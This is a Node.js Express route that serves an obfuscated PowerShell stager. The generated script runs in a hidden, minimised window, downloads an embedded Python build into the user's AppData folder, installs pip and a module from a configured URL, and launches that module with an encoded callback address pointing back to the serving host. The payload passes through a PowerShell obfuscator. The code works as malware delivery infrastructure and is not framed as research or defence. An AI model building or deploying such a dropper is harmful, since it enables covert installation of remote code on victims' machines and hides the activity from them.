const express = require('express')

const psKovak = require('../powershell-kovak/js/ps-kovak')
const config = require('../config')

const router = express.Router()

router.get("/", (req, res) => {
    res.setHeader("Content-Type", "text/plain")
    const options = Object.keys(req.query)
    let moduleArgs = `${req.protocol}://${req.get('host')}`
    let isPowershell = false

    if (options.length !== 0) {
        isPowershell = options[0].split("-")[0] === "1"
        moduleArgs = `${moduleArgs}@@${options[0]}`
    }

    moduleArgs = btoa(moduleArgs)

    const payload = `
function Get-Arch() {$arch = (Get-CimInstance Win32_OperatingSystem).OSArchitecture;if ($arch -like '64*') {'amd64'}else{'win32'}}
function Run-The-Module() {.\\pythonw -m ${config.module.name} ${moduleArgs}}
cd $env:APPDATA
$FolderName = 'python313'
if((Test-Path $FolderName) -and (Test-Path 'hasPython')) {cd $FolderName;Run-The-Module;exit}else{if(Test-Path $FolderName) {rm $FolderName -Recurse -Force};mkdir $FolderName;cd $FolderName}
$ArchName = Get-Arch
iwr -Uri ('https://www.python.org/ftp/python/3.13.5/python-3.13.5-embed-' + $ArchName + '.zip') -OutFile python.zip
iwr -Uri 'https://bootstrap.pypa.io/get-pip.py' -OutFile getpip.py
Expand-Archive -Path python.zip -DestinationPath .
Add-Content -Path python313._pth -Value 'import site'
.\\python getpip.py
.\\Scripts\\pip install setuptools wheel
.\\Scripts\\pip install ${config.module.url}
Run-The-Module
`

    if (isPowershell) {
        return res.send(encodePayload(payload))
    }

    res.send(`start /MIN powershell -WindowStyle Hidden -c "${encodePayload(payload)}"`)
})

function encodePayload(code) {
    return psKovak.run({
        method: "unicodeMethod",
        code,
        base64: false,
        hideWindow: false
    })
}

module.exports = router